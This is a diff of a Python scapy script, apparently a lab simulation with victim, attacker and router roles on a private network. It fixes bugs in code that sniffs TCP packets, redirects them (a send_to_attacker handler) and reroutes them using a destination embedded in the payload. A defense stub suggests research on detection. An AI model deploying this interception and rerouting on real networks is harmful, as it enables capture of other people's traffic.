@@ -6,11 +6,11 @@
 from scapy.all import *
 from copy import deepcopy
 
-role = 'victim'
+role = 'router'
 
 victim_ip = '129.254.0.8'
 attacker_ip = '129.254.0.7'
-router_ip = '129.254.0.10'
+router_ip = '129.254.0.4'
 
 #Modular packet sniffing function
 def packet_sniffer(my_filter, my_prn):
@@ -32,7 +32,7 @@ def send_to_router(packet):
     new_packet = IP(dst=router_ip)/TCP(dport=true_dport)/Raw(load=true_load + load_append)
 
     print('Sending packet to router:', new_packet.show())
-    r1 = sr1(new_packet, timeout=5)
+    r1 = sr1(new_packet, timeout=5,iface='eth1')
 
 #Victim functions
 #---
@@ -65,12 +65,12 @@ def reroute_packet(packet):
         data = packet[Raw].load.decode("utf-8")
     except:
         data = ''
-    data = append_orig_source(data, orig_source)
+    data = append_orig_source(data, packet[IP].src)
 
     forwarded_packet = IP()/TCP()/Raw(load=data)
 
     #Get destination address that was embedded in the payload
-    dst_addr = parse_payload(data)
+    dst_addr = get_packet_destination(data)
         
     # IP address is always the first in the list 
     
@@ -78,13 +78,12 @@ def reroute_packet(packet):
     # Source = hardcoded router's IP address 
     forwarded_packet[IP].src = get_if_addr('eth1')
     forwarded_packet[IP].dst = dst_addr
-    r1 = sr1(new_packet, timeout=5)
         
     forwarded_packet[TCP].sport = packet[TCP].sport
     forwarded_packet[IP].dport = packet[TCP].dport
 
-    print('Forwarded packet:', forwrded_packet.show())
-    r1 = sr1(forwarded_packet, timeout=5)
+    print('Forwarded packet:', forwarded_packet.show())
+    r1 = sr1(forwarded_packet, timeout=5,iface='eth1')
 
 def defense_model(packet):
     return 0
@@ -95,9 +94,12 @@ def get_packet_destination(data):
     # Look for this at the end of the payload
     test_field = "|ORIG_DST="
                                                          
-    if test_field in data:
-        # end info = information after the main payload 
-        end_info = data.partition(test_field)[2] 
+    # end info = information after the main payload 
+    end_info = data.partition(test_field)[2] 
+    if(end_info == ''):
+        print(end_info)
+        print(data)
+        return -1;
                                                          
     # Split the end substring by | delimiter 
     end_list = end_info.split('|')
@@ -109,8 +111,8 @@ def get_packet_destination(data):
 
 
 if __name__=='__main__':
+    local_ip = get_if_addr('eth1')
     if(role == 'victim'):
-        local_ip = get_if_addr('eth1')
         packet_sniffer('src host ' + local_ip + ' and tcp', send_to_attacker)
     elif(role == 'router'):
         packet_sniffer('dst host ' + local_ip + ' and tcp', reroute_packet)
